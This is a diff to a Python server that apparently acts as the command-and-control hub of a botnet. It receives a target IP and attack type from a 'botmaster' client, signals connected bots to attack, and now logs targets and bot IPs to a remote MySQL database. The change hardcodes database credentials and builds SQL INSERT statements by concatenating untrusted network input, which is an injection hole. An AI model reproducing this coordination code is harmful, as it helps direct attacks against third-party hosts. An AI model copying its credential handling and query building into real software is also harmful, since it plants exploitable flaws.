@@ -3,7 +3,7 @@ import sys
 import socket
 import threading
 import time
-
+import mysql.connector
 startAttack: bool = False
 ip = '192.168.100.19'
 sqlDatabaseHosts = []
@@ -11,6 +11,17 @@ sqlDatabaseTargetIP = []
 clientSockets = []
 attack_type=''
 
+
+
+
+mydb = mysql.connector.connect(
+    host="178.43.168.155",
+    user="Szymon",
+    password="haslo1234",
+    database="sieci",
+)
+
+mycursor = mydb.cursor()
 
 def thread_for_botmaster(c, st):  # wrzucic w while???
     global startAttack
@@ -27,6 +38,14 @@ def thread_for_botmaster(c, st):  # wrzucic w while???
     attack_type=str(c.recv(1).decode())
     print("typ: "+attack_type)
     ip = str(c.recv(16).decode())
+    ip2 = "'" + ip + "'"
+    print('received target ip=' + ip)
+    sqlDatabaseTargetIP.append(ip)
+    # dodawanie do bazy
+    sql = "INSERT INTO Target (adres_ip) VALUES (" + ip2 + ")"
+    mycursor.execute(sql)
+    mydb.commit()
+    #  //////
     print('received target ip=' + ip)
     sqlDatabaseTargetIP.append(ip)
     startAttack = True
@@ -114,7 +133,7 @@ def closeServer(s):
 if __name__ == '__main__':
 
     host = '127.0.0.1'
-    #host = '192.168.100.6'
+    host = '192.168.100.7'
     port = 65432
     max_connections = 5
     pom = 0
@@ -141,6 +160,16 @@ if __name__ == '__main__':
                 data = client_socket.recv(1).decode()  # info about which client type is connected: 1-bot, 2-botmaster
                 if int(data) == 1:
                     print('normal bot connected')
+                    host, port = client_socket.getpeername()
+                    smieci = "'" + host + "'"
+                    print(sqlDatabaseHosts)
+                    sql = "INSERT INTO Hosts (adres_ip) VALUES (" + str(smieci) + ")"  ### nie wiem co to za dane wiec dalem taka nazwe zmien
+                    mycursor.execute(sql)
+                    mydb.commit()
+                    mycursor.execute("SELECT * FROM Hosts")
+                    myresult = mycursor.fetchall()
+                    for x in myresult:
+                        print(x)
 
                     sqlDatabaseHosts.append(client_socket.getpeername())
                     print(sqlDatabaseHosts)
